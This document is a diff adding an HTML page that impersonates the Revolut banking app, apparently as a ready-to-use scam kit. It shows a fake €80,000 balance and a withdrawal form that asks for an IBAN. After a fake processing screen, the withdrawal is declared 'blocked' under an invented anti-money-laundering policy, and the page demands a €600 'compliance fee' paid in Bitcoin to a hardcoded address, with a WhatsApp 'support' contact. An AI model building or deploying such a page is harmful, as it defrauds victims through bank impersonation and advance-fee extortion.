@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+<title>Revolut</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; background: #000; display: flex; justify-content: center; min-height: 100vh; }
+  .phone { width: 100%; max-width: 390px; min-height: 100vh; position: relative; overflow-x: hidden; }
+
+  /* ========== HOME ========== */
+  #page-home { display: flex; flex-direction: column; min-height: 100vh; background: linear-gradient(180deg, #5B1FBF 0%, #3a0070 38%, #1a1a2e 68%, #0d0d1a 100%); }
+  .status-bar { display: flex; justify-content: space-between; align-items: center; padding: 10px 18px 6px; font-size: 12px; font-weight: 600; color: #fff; }
+  .top-nav { display: flex; align-items: center; padding: 6px 14px 10px; gap: 10px; }
+  .avatar { width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #FF8C00, #FFA500); display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 13px; color: #fff; flex-shrink: 0; cursor: pointer; }
+  .search-bar { flex: 1; display: flex; align-items: center; gap: 8px; background: rgba(255,255,255,0.15); border-radius: 50px; padding: 9px 14px; cursor: pointer; }
+  .search-bar span { color: rgba(255,255,255,0.6); font-size: 13px; }
+  .top-icons { display: flex; gap: 8px; }
+  .icon-btn { width: 34px; height: 34px; border-radius: 50%; background: rgba(255,255,255,0.15); border: none; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+
+  .balance-section { text-align: center; padding: 28px 16px 20px; }
+  .balance-label { color: rgba(255,255,255,0.65); font-size: 13px; margin-bottom: 8px; }
+  .balance-amount { font-size: 50px; font-weight: 800; color: #fff; letter-spacing: -1px; }
+  .balance-amount sup { font-size: 30px; }
+  .rekeningen-btn { margin-top: 14px; padding: 9px 24px; border-radius: 50px; background: rgba(255,255,255,0.18); border: none; color: #fff; font-size: 13px; font-weight: 500; cursor: pointer; }
+
+  .dots { display: flex; justify-content: center; gap: 5px; margin: 10px 0 20px; }
+  .dot { width: 6px; height: 6px; border-radius: 50%; background: rgba(255,255,255,0.3); }
+  .dot.active { background: rgba(255,255,255,0.7); }
+
+  .action-btns { display: flex; justify-content: space-around; padding: 0 20px 28px; }
+  .action-btn { display: flex; flex-direction: column; align-items: center; gap: 7px; background: none; border: none; cursor: pointer; }
+  .action-circle { width: 56px; height: 56px; border-radius: 50%; background: rgba(255,255,255,0.18); display: flex; align-items: center; justify-content: center; }
+  .action-btn span { color: #fff; font-size: 11px; text-align: center; line-height: 1.3; }
+
+  .promo-card { margin: 0 14px 14px; border-radius: 18px; background: rgba(28,28,50,0.85); padding: 16px; position: relative; }
+  .promo-close { position: absolute; top: 12px; right: 14px; background: none; border: none; color: rgba(255,255,255,0.4); font-size: 18px; cursor: pointer; }
+  .promo-title { color: #fff; font-size: 14px; font-weight: 700; }
+  .promo-sub { color: rgba(255,255,255,0.5); font-size: 12px; margin-top: 3px; }
+
+  .tx-card { margin: 0 14px 14px; border-radius: 18px; background: rgba(18,18,32,0.92); padding: 14px; }
+  .tx-row { display: flex; align-items: center; gap: 12px; }
+  .tx-icon { width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg, #003399, #0055cc); position: relative; flex-shrink: 0; }
+  .tx-btc { position: absolute; bottom: -2px; right: -2px; width: 18px; height: 18px; border-radius: 50%; background: #F7931A; display: flex; align-items: center; justify-content: center; font-size: 9px; font-weight: 900; color: #fff; }
+  .tx-info { flex: 1; }
+  .tx-name { color: #fff; font-size: 13px; font-weight: 600; }
+  .tx-date { color: rgba(255,255,255,0.45); font-size: 11px; margin-top: 1px; }
+  .tx-amount { text-align: right; }
+  .tx-eur { color: #fff; font-size: 13px; font-weight: 600; }
+  .tx-btc-val { color: #4ade80; font-size: 11px; margin-top: 1px; }
+
+  .spacer { flex: 1; }
+
+  .bottom-nav { display: flex; justify-content: space-around; align-items: center; padding: 10px 8px 18px; border-top: 1px solid rgba(255,255,255,0.08); background: rgba(8,8,18,0.97); }
+  .nav-btn { display: flex; flex-direction: column; align-items: center; gap: 4px; background: none; border: none; cursor: pointer; }
+  .nav-label { font-size: 10px; color: rgba(255,255,255,0.45); }
+  .nav-label.active { color: #fff; font-weight: 600; }
+  .revolut-r { width: 22px; height: 22px; border-radius: 4px; border: 2px solid #fff; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 11px; color: #fff; }
+
+  /* ========== CONNECTION ERROR MODAL ========== */
+  .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.72); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
+  .modal-overlay.show { display: flex; }
+  .modal-box { background: #14142a; border: 1px solid rgba(255,255,255,0.1); border-radius: 22px; padding: 28px 24px; width: 100%; max-width: 320px; text-align: center; animation: fadeUp 0.25s ease; }
+  @keyframes fadeUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+  .modal-icon { width: 60px; height: 60px; border-radius: 50%; background: rgba(255,60,60,0.12); border: 1px solid rgba(255,60,60,0.22); display: flex; align-items: center; justify-content: center; margin: 0 auto 14px; }
+  .modal-title { color: #fff; font-size: 18px; font-weight: 700; margin-bottom: 8px; }
+  .modal-text { color: rgba(255,255,255,0.5); font-size: 13px; line-height: 1.6; margin-bottom: 22px; }
+  .modal-btn { width: 100%; padding: 14px; border-radius: 14px; background: linear-gradient(135deg, #6B2FD9, #4B0082); border: none; color: #fff; font-size: 14px; font-weight: 700; cursor: pointer; }
+
+  /* ========== WITHDRAW PAGE ========== */
+  #page-withdraw { display: none; flex-direction: column; min-height: 100vh; background: linear-gradient(180deg, #1a0533 0%, #0d0d1a 100%); }
+  .withdraw-header { display: flex; align-items: center; gap: 12px; padding: 18px 16px 10px; }
+  .back-btn { width: 36px; height: 36px; border-radius: 50%; background: rgba(255,255,255,0.1); border: none; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #fff; }
+  .withdraw-title { color: #fff; font-size: 17px; font-weight: 700; }
+  .withdraw-sub { color: rgba(255,255,255,0.45); font-size: 12px; }
+
+  .balance-card { margin: 10px 16px 20px; border-radius: 18px; padding: 18px 20px; background: linear-gradient(135deg, rgba(107,47,217,0.35), rgba(75,0,130,0.35)); border: 1px solid rgba(255,255,255,0.1); }
+  .balance-card-label { color: rgba(255,255,255,0.55); font-size: 12px; margin-bottom: 5px; }
+  .balance-card-amount { color: #fff; font-size: 30px; font-weight: 800; }
+  .verified { color: #4ade80; font-size: 11px; margin-top: 5px; }
+
+  .form-section { padding: 0 16px 20px; }
+  .field-label { color: rgba(255,255,255,0.6); font-size: 13px; font-weight: 500; margin-bottom: 8px; display: block; }
+  .field-input { width: 100%; padding: 14px 16px; border-radius: 14px; background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.12); color: #fff; font-size: 14px; outline: none; font-family: inherit; }
+  .field-input::placeholder { color: rgba(255,255,255,0.28); }
+  .field-input:focus { border-color: rgba(107,47,217,0.6); }
+
+  .amount-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-top: 8px; }
+  .amount-opt { border: 1px solid rgba(255,255,255,0.1); border-radius: 14px; padding: 12px 8px; text-align: center; cursor: pointer; background: rgba(255,255,255,0.06); transition: all 0.2s; }
+  .amount-opt.selected { background: linear-gradient(135deg, #6B2FD9, #4B0082); border-color: rgba(107,47,217,0.6); transform: scale(1.02); }
+  .amount-pct { color: #fff; font-size: 15px; font-weight: 700; }
+  .amount-val { color: rgba(255,255,255,0.6); font-size: 11px; margin-top: 2px; }
+  .amount-opt.selected .amount-val { color: rgba(255,255,255,0.8); }
+
+  .selected-summary { border-radius: 14px; padding: 14px 16px; background: rgba(107,47,217,0.12); border: 1px solid rgba(107,47,217,0.28); display: flex; justify-content: space-between; align-items: center; margin-top: 14px; }
+  .sum-label { color: rgba(255,255,255,0.5); font-size: 11px; }
+  .sum-val { color: #fff; font-size: 20px; font-weight: 700; margin-top: 2px; }
+  .sum-fee-label { color: rgba(255,255,255,0.5); font-size: 11px; text-align: right; }
+  .sum-fee-val { color: #4ade80; font-size: 13px; font-weight: 600; text-align: right; margin-top: 2px; }
+
+  .security-note { border-radius: 14px; padding: 14px; background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.07); display: flex; gap: 12px; align-items: flex-start; margin-top: 14px; }
+  .security-note p { color: rgba(255,255,255,0.45); font-size: 12px; line-height: 1.6; }
+
+  .withdraw-btn { width: calc(100% - 32px); margin: 14px 16px 24px; padding: 16px; border-radius: 16px; background: linear-gradient(135deg, #6B2FD9, #4B0082); border: none; color: #fff; font-size: 15px; font-weight: 700; cursor: pointer; opacity: 0.45; transition: opacity 0.2s; }
+  .withdraw-btn.active { opacity: 1; }
+
+  /* ========== LOADING PAGE ========== */
+  #page-loading { display: none; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background: linear-gradient(180deg, #1a0533 0%, #0d0d1a 100%); text-align: center; padding: 30px; }
+  .spinner-wrap { position: relative; width: 96px; height: 96px; margin-bottom: 36px; }
+  .spin-outer { width: 96px; height: 96px; border-radius: 50%; border: 3px solid rgba(107,47,217,0.2); border-top-color: #8B5FE8; animation: spin 1s linear infinite; position: absolute; }
+  .spin-inner { width: 70px; height: 70px; border-radius: 50%; border: 3px solid rgba(107,47,217,0.1); border-bottom-color: rgba(160,100,255,0.55); animation: spin 1.5s linear infinite reverse; position: absolute; top: 13px; left: 13px; }
+  .spin-icon { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .loading-title { color: #fff; font-size: 20px; font-weight: 700; margin-bottom: 6px; }
+  .loading-amount { color: rgba(255,255,255,0.55); font-size: 14px; margin-bottom: 6px; }
+  .loading-sub { color: rgba(255,255,255,0.3); font-size: 12px; line-height: 1.7; max-width: 260px; margin: 12px auto 0; }
+  .bounce-dots { display: flex; gap: 7px; justify-content: center; margin-top: 32px; }
+  .bdot { width: 8px; height: 8px; border-radius: 50%; background: #8B5FE8; animation: bounce 1.1s infinite; }
+  .bdot:nth-child(2) { animation-delay: 0.18s; }
+  .bdot:nth-child(3) { animation-delay: 0.36s; }
+  @keyframes bounce { 0%,100% { transform: translateY(0); opacity: 0.35; } 50% { transform: translateY(-8px); opacity: 1; } }
+
+  /* ========== ERROR / PAYMENT PANEL ========== */
+  #page-error { display: none; flex-direction: column; min-height: 100vh; background: linear-gradient(180deg, #1a0533 0%, #0d0d1a 100%); position: relative; overflow: hidden; }
+  .error-bg-content { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0.25; padding-bottom: 40px; }
+  .error-bg-content p { color: #fff; font-size: 13px; margin-top: 10px; }
+  .error-panel { border-radius: 28px 28px 0 0; background: #0f0f22; border: 1px solid rgba(255,255,255,0.07); border-bottom: none; padding: 10px 20px 36px; transform: translateY(100%); transition: transform 0.75s cubic-bezier(0.16, 1, 0.3, 1); }
+  .error-panel.slide-up { transform: translateY(0); }
+  .panel-handle { width: 40px; height: 4px; border-radius: 4px; background: rgba(255,255,255,0.18); margin: 0 auto 20px; }
+  .err-icon { width: 62px; height: 62px; border-radius: 50%; background: rgba(255,50,50,0.1); border: 1px solid rgba(255,50,50,0.22); display: flex; align-items: center; justify-content: center; margin: 0 auto 14px; }
+  .err-title { color: #fff; font-size: 20px; font-weight: 800; text-align: center; margin-bottom: 4px; }
+  .err-sub { color: rgba(255,255,255,0.42); font-size: 12px; text-align: center; margin-bottom: 18px; }
+  .err-desc { background: rgba(255,50,50,0.07); border: 1px solid rgba(255,50,50,0.14); border-radius: 14px; padding: 14px; color: rgba(255,255,255,0.75); font-size: 13px; line-height: 1.65; text-align: center; margin-bottom: 16px; }
+  .err-desc strong { color: #fff; }
+  .err-desc span { color: #f87171; font-weight: 600; }
+  .fee-box { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.07); border-radius: 14px; padding: 14px; margin-bottom: 16px; }
+  .fee-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+  .fee-row:last-child { margin-bottom: 0; }
+  .fee-key { color: rgba(255,255,255,0.5); font-size: 12px; }
+  .fee-val { color: #fff; font-size: 13px; font-weight: 700; }
+  .fee-val.orange { color: #fb923c; }
+  .btc-addr-wrap { background: rgba(255,255,255,0.04); border-radius: 10px; padding: 10px 12px; margin-top: 10px; }
+  .btc-addr-label { color: rgba(255,255,255,0.35); font-size: 11px; margin-bottom: 4px; }
+  .btc-addr { color: rgba(255,255,255,0.75); font-size: 11px; font-family: monospace; word-break: break-all; line-height: 1.5; }
+  .pay-btn { width: 100%; padding: 15px; border-radius: 14px; background: linear-gradient(135deg, #f7931a, #d97706); border: none; color: #fff; font-size: 15px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 10px; }
+  .support-btn { width: 100%; padding: 13px; border-radius: 14px; background: rgba(37,211,102,0.1); border: 1px solid rgba(37,211,102,0.22); color: #25d366; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
+  .ref-note { color: rgba(255,255,255,0.2); font-size: 11px; text-align: center; margin-top: 14px; line-height: 1.6; }
+
+  /* svgs as inline */
+  svg { display: block; }
+</style>
+</head>
+<body>
+<div class="phone">
+
+  <!-- ===== CONNECTION ERROR MODAL ===== -->
+  <div class="modal-overlay" id="conn-modal">
+    <div class="modal-box">
+      <div class="modal-icon">
+        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#ff5050" stroke-width="2">
+          <path d="M1 1l22 22M16.72 11.06A10.94 10.94 0 0 1 19 12.55M5 12.55a10.94 10.94 0 0 1 5.17-2.39M10.71 5.05A16 16 0 0 1 22.56 9M1.42 9a15.91 15.91 0 0 1 4.7-2.88M8.53 16.11a6 6 0 0 1 6.95 0M12 20h.01"/>
+        </svg>
+      </div>
+      <div class="modal-title">Connection Error</div>
+      <p class="modal-text">Unable to connect to the server. Please check your internet connection and try again.</p>
+      <button class="modal-btn" onclick="closeModal()">Try Again</button>
+    </div>
+  </div>
+
+  <!-- ===== HOME PAGE ===== -->
+  <div id="page-home">
+    <div class="status-bar">
+      <span>19:00</span>
+      <span>⚡ 62%</span>
+    </div>
+
+    <div class="top-nav">
+      <div class="avatar" onclick="showModal()">AE</div>
+      <div class="search-bar" onclick="showModal()">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.6)" stroke-width="2.5">
+          <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+        </svg>
+        <span>Zoeken</span>
+      </div>
+      <div class="top-icons">
+        <button class="icon-btn" onclick="showModal()">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="white">
+            <rect x="3" y="3" width="4" height="8" rx="1"/><rect x="10" y="3" width="4" height="5" rx="1"/><rect x="17" y="3" width="4" height="11" rx="1"/><rect x="3" y="14" width="4" height="7" rx="1"/><rect x="10" y="11" width="4" height="10" rx="1"/>
+          </svg>
+        </button>
+        <button class="icon-btn" onclick="showModal()">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
+            <rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <div class="balance-section">
+      <div class="balance-label">Persoonlijk · EUR</div>
+      <div class="balance-amount">€ 80.000<sup>,00</sup></div>
+      <button class="rekeningen-btn" onclick="showModal()">Rekeningen</button>
+    </div>
+
+    <div class="dots">
+      <div class="dot active"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+
+    <div class="action-btns">
+      <button class="action-btn" onclick="showModal()">
+        <div class="action-circle">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
+        </div>
+        <span>Geld<br/>toevoegen</span>
+      </button>
+      <button class="action-btn" onclick="showModal()">
+        <div class="action-circle">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><path d="M7 16V4m0 0L3 8m4-4 4 4M17 8v12m0 0 4-4m-4 4-4-4"/></svg>
+        </div>
+        <span>Verplaatsen</span>
+      </button>
+      <button class="action-btn" onclick="goWithdraw()">
+        <div class="action-circle">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9,22 9,12 15,12 15,22"/></svg>
+        </div>
+        <span>Opnemen</span>
+      </button>
+      <button class="action-btn" onclick="showModal()">
+        <div class="action-circle">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><circle cx="5" cy="12" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="19" cy="12" r="2"/></svg>
+        </div>
+        <span>Meer</span>
+      </button>
+    </div>
+
+    <div class="promo-card">
+      <button class="promo-close" onclick="showModal()">✕</button>
+      <div class="promo-title">Nodig vrienden uit,<br/>verdien geld</div>
+      <div class="promo-sub">Verdien tot € 200 voor elke ...</div>
+    </div>
+
+    <div class="dots" style="margin-bottom:14px;">
+      <div class="dot active"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+
+    <div class="tx-card">
+      <div class="tx-row">
+        <div class="tx-icon">
+          <div class="tx-btc">₿</div>
+        </div>
+        <div class="tx-info">
+          <div class="tx-name">EUR → BTC</div>
+          <div class="tx-date">Gisteren, 20:00</div>
+        </div>
+        <div class="tx-amount">
+          <div class="tx-eur">€ -780</div>
+          <div class="tx-btc-val">+0,012 BTC</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="spacer"></div>
+
+    <div class="bottom-nav">
+      <button class="nav-btn">
+        <div class="revolut-r">R</div>
+        <span class="nav-label active">Start</span>
+      </button>
+      <button class="nav-btn" onclick="showModal()">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.4)" stroke-width="1.5"><path d="M3 3v18h18"/><path d="m19 9-5 5-4-4-3 3"/></svg>
+        <span class="nav-label">Beleggen</span>
+      </button>
+      <button class="nav-btn" onclick="showModal()">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.4)" stroke-width="1.5"><path d="M7 16l-4-4 4-4M17 8l4 4-4 4M13 5l-2 14"/></svg>
+        <span class="nav-label">Betalingen</span>
+      </button>
+      <button class="nav-btn" onclick="showModal()">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.4)" stroke-width="1.5"><circle cx="9.5" cy="9" r="6"/><path d="m21 21-4.35-4.35"/></svg>
+        <span class="nav-label">Crypto</span>
+      </button>
+      <button class="nav-btn" onclick="showModal()">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.4)" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
+        <span class="nav-label">RevPoints</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- ===== WITHDRAW PAGE ===== -->
+  <div id="page-withdraw">
+    <div class="withdraw-header">
+      <button class="back-btn" onclick="goHome()">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+      <div>
+        <div class="withdraw-title">Withdraw Funds</div>
+        <div class="withdraw-sub">Secure Bank Transfer</div>
+      </div>
+    </div>
+
+    <div class="balance-card">
+      <div class="balance-card-label">Available Balance</div>
+      <div class="balance-card-amount">€ 80.000,00</div>
+      <div class="verified">● Verified Account</div>
+    </div>
+
+    <div class="form-section">
+      <label class="field-label">Bank Account / IBAN</label>
+      <input class="field-input" id="iban-input" type="text" placeholder="Enter your IBAN or bank account number" oninput="checkForm()" />
+    </div>
+
+    <div class="form-section" style="padding-top:0;">
+      <label class="field-label">Select Amount</label>
+      <div class="amount-grid">
+        <div class="amount-opt" id="opt-50" onclick="selectPct(50)">
+          <div class="amount-pct">50%</div>
+          <div class="amount-val">€ 40.000</div>
+        </div>
+        <div class="amount-opt" id="opt-75" onclick="selectPct(75)">
+          <div class="amount-pct">75%</div>
+          <div class="amount-val">€ 60.000</div>
+        </div>
+        <div class="amount-opt" id="opt-100" onclick="selectPct(100)">
+          <div class="amount-pct">100%</div>
+          <div class="amount-val">€ 80.000</div>
+        </div>
+      </div>
+
+      <div class="selected-summary" id="summary-box" style="display:none;">
+        <div>
+          <div class="sum-label">Withdrawal Amount</div>
+          <div class="sum-val" id="sum-amount">€ 0</div>
+        </div>
+        <div>
+          <div class="sum-fee-label">Processing Fee</div>
+          <div class="sum-fee-val">Free</div>
+        </div>
+      </div>
+
+      <div class="security-note" style="margin-top:14px;">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="rgba(107,47,217,0.85)" stroke-width="2" style="flex-shrink:0;margin-top:2px;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        <p>Your withdrawal is secured by 256-bit encryption. Funds are typically processed within 1–3 business days.</p>
+      </div>
+    </div>
+
+    <button class="withdraw-btn" id="withdraw-btn" onclick="startWithdrawal()" disabled>Withdraw Funds</button>
+  </div>
+
+  <!-- ===== LOADING PAGE ===== -->
+  <div id="page-loading">
+    <div class="spinner-wrap">
+      <div class="spin-outer"></div>
+      <div class="spin-inner"></div>
+      <div class="spin-icon">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="rgba(107,47,217,0.8)" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      </div>
+    </div>
+    <div class="loading-title">Processing Withdrawal</div>
+    <div class="loading-amount" id="loading-amt">Amount: <strong>€ 0</strong></div>
+    <div class="loading-sub">Please wait while we securely process your transaction. Do not close this page.</div>
+    <div class="bounce-dots">
+      <div class="bdot"></div>
+      <div class="bdot"></div>
+      <div class="bdot"></div>
+    </div>
+  </div>
+
+  <!-- ===== ERROR / PAYMENT PAGE ===== -->
+  <div id="page-error">
+    <div class="error-bg-content">
+      <svg width="38" height="38" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      <p id="err-bg-amt">Withdrawal of € 0</p>
+    </div>
+    <div class="error-panel" id="error-panel">
+      <div class="panel-handle"></div>
+      <div class="err-icon">
+        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#ff4040" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
+      </div>
+      <div class="err-title">Withdrawal Blocked</div>
+      <div class="err-sub">Privacy Settings &amp; Authorized Licensed Policy</div>
+      <div class="err-desc">
+        Your withdrawal of <strong id="err-amount">€ 0</strong> has been flagged under our
+        <span>Privacy &amp; Anti-Money Laundering Policy</span>.
+        A compliance verification fee is required to authorize and release your funds.
+      </div>
+      <div class="fee-box">
+        <div class="fee-row">
+          <span class="fee-key">Compliance Fee (Blockchain)</span>
+          <span class="fee-val">€600</span>
+        </div>
+        <div class="fee-row">
+          <span class="fee-key">Payment Method</span>
+          <span class="fee-val orange">Bitcoin (BTC)</span>
+        </div>
+        <div class="btc-addr-wrap">
+          <div class="btc-addr-label">Send to BTC Address</div>
+          <div class="btc-addr">bc1qvr8qsteh2m2n88mmyjr86dc4d8lxzr2v2lqqr5</div>
+        </div>
+      </div>
+      <button class="pay-btn" onclick="payNow()">
+        <svg width="17" height="17" viewBox="0 0 24 24" fill="white"><path d="M23.638 14.904c-1.602 6.43-8.113 10.34-14.542 8.736C2.67 22.05-1.244 15.525.362 9.105 1.962 2.67 8.475-1.243 14.9.358c6.43 1.605 10.342 8.115 8.738 14.548v-.002zm-6.35-4.613c.24-1.59-.974-2.45-2.64-3.03l.54-2.153-1.315-.33-.525 2.107c-.345-.087-.705-.167-1.064-.25l.526-2.127-1.32-.33-.54 2.165c-.285-.067-.565-.132-.84-.2l-1.815-.45-.35 1.407s.975.225.955.236c.535.136.63.486.615.766l-1.477 5.92c-.075.166-.24.406-.614.314.015.02-.96-.24-.96-.24l-.66 1.51 1.71.426.93.242-.54 2.19 1.32.327.54-2.165c.36.1.705.19 1.05.273l-.51 2.154 1.32.33.545-2.19c2.24.427 3.93.257 4.64-1.774.57-1.637-.03-2.58-1.217-3.196.854-.193 1.5-.76 1.68-1.93h.01zm-3.01 4.22c-.404 1.64-3.157.75-4.05.53l.72-2.9c.896.23 3.757.67 3.33 2.37zm.41-4.24c-.37 1.49-2.662.735-3.405.55l.654-2.64c.744.18 3.137.524 2.75 2.084v.006z"/></svg>
+        Pay €600 Now
+      </button>
+      <button class="support-btn" onclick="contactSupport()">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#25d366"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+        Contact Support
+      </button>
+      <div class="ref-note" id="ref-note">Once payment is confirmed, your withdrawal will be released within 24 hours.</div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  const BTC_ADDRESS = 'bc1qvr8qsteh2m2n88mmyjr86dc4d8lxzr2v2lqqr5';
+  const WHATSAPP   = '15152169271';
+  const BALANCE    = 80000;
+
+  let selectedPct = null;
+
+  function showModal() {
+    document.getElementById('conn-modal').classList.add('show');
+  }
+  function closeModal() {
+    document.getElementById('conn-modal').classList.remove('show');
+  }
+
+  function showPage(id) {
+    ['page-home','page-withdraw','page-loading','page-error'].forEach(p => {
+      const el = document.getElementById(p);
+      el.style.display = 'none';
+    });
+    document.getElementById(id).style.display = 'flex';
+    window.scrollTo(0,0);
+  }
+
+  function goHome()     { showPage('page-home'); }
+  function goWithdraw() { showPage('page-withdraw'); }
+
+  function selectPct(pct) {
+    selectedPct = pct;
+    document.querySelectorAll('.amount-opt').forEach(el => el.classList.remove('selected'));
+    document.getElementById('opt-' + pct).classList.add('selected');
+    const amt = (BALANCE * pct / 100).toLocaleString('nl-NL', {style:'currency', currency:'EUR'});
+    document.getElementById('sum-amount').textContent = amt;
+    document.getElementById('summary-box').style.display = 'flex';
+    checkForm();
+  }
+
+  function checkForm() {
+    const iban = document.getElementById('iban-input').value.trim();
+    const btn  = document.getElementById('withdraw-btn');
+    const ok   = iban.length > 4 && selectedPct !== null;
+    btn.disabled = !ok;
+    btn.classList.toggle('active', ok);
+    if (selectedPct) {
+      const amt = (BALANCE * selectedPct / 100).toLocaleString('nl-NL', {style:'currency', currency:'EUR'});
+      btn.textContent = 'Withdraw ' + amt;
+    } else {
+      btn.textContent = 'Withdraw Funds';
+    }
+  }
+
+  function startWithdrawal() {
+    if (!selectedPct) return;
+    const amt = (BALANCE * selectedPct / 100).toLocaleString('nl-NL', {style:'currency', currency:'EUR'});
+    document.getElementById('loading-amt').innerHTML = 'Amount: <strong>' + amt + '</strong>';
+    showPage('page-loading');
+
+    setTimeout(function() {
+      document.getElementById('err-amount').textContent = amt;
+      document.getElementById('err-bg-amt').textContent = 'Withdrawal of ' + amt;
+      document.getElementById('ref-note').textContent =
+        'Once payment is confirmed, your withdrawal will be released within 24 hours. Reference: TXN-' +
+        Math.random().toString(36).substring(2,10).toUpperCase();
+      showPage('page-error');
+      setTimeout(function() {
+        document.getElementById('error-panel').classList.add('slide-up');
+      }, 80);
+    }, 6000);
+  }
+
+  function payNow() {
+    window.open('bitcoin:' + BTC_ADDRESS + '?amount=0.006', '_blank');
+  }
+
+  function contactSupport() {
+    window.open('https://wa.me/' + WHATSAPP, '_blank');
+  }
+
+  // Close modal on overlay click
+  document.getElementById('conn-modal').addEventListener('click', function(e) {
+    if (e.target === this) closeModal();
+  });
+
+  // Init
+  showPage('page-home');
+</script>
+</body>
+</html>
